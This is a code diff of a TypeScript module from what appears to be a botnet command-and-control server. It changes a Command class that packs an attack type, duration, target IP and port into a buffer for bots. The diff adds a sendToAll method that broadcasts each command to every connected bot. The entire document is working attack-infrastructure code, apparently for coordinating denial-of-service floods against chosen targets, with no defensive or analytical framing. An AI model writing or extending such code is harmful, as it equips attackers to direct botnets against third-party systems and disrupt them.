@@ -1,4 +1,5 @@
 import net from 'net';
+import { SocketManager } from './clients';
 
 export enum CommandType {
     PING = 1 << 0,  // C2 check if bot is alive
@@ -10,7 +11,7 @@ export enum CommandType {
 }
 
 export class Command {
-    private readonly socket: net.Socket;
+    private readonly socket: net.Socket | undefined;
     private readonly type: CommandType;
     private readonly duration: number;
     private readonly targetIp: string;
@@ -18,15 +19,16 @@ export class Command {
 
     private static readonly TERMINATOR = 0x0A;
 
-    public constructor(socket: net.Socket, type: CommandType, duration: number, targetIp: string, port: number) {
-        this.socket = socket;
+    public constructor(type: CommandType, duration: number, targetIp: string, port: number, socket?: net.Socket) {
         this.type = type;
         this.duration = duration;
         this.targetIp = targetIp;
         this.port = port;
+
+        this.socket = socket;
     }
 
-    private build(): Buffer {
+    public build(): Buffer {
         const parsedIp = this.targetIp.split('.').map(Number);
         if (parsedIp.length !== 4 || parsedIp.some(isNaN)) {
             throw new Error(`Invalid IP address: ${this.targetIp}`);
@@ -47,6 +49,14 @@ export class Command {
     }
 
     public send(): boolean {
-        return this.socket.write(this.build());
+
+        if(this.socket) 
+            return this.socket.write(this.build());
+
+        return false;
+    }
+
+    public async sendToAll(): Promise<void> {
+        return await SocketManager.broadcastMessage(this.build());
     }
 }
